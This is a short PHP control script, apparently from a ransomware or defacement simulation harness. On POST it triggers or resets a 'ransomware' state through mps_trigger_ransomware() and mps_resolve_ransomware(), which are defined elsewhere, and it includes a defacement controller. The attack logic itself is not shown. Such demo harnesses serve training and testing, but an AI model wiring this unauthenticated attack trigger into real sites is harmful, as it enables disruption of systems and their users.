<?php
include("defacementController.php");

$status_file = "status.txt";

if($_POST['action']):
	if($_POST['action'] == "attack"){
		$status = $_POST['attackType'];
		
		if($status  == 1){
			mps_trigger_ransomware();
		}
		
		file_put_contents($status_file , $status);
		
	}else if($_POST['action'] == "reset"){
		$status = file_get_contents($status_file);
		
		if($status == 1){
			mps_resolve_ransomware();
		}
		
		file_put_contents($status_file , "0");
	}
	
endif;

?>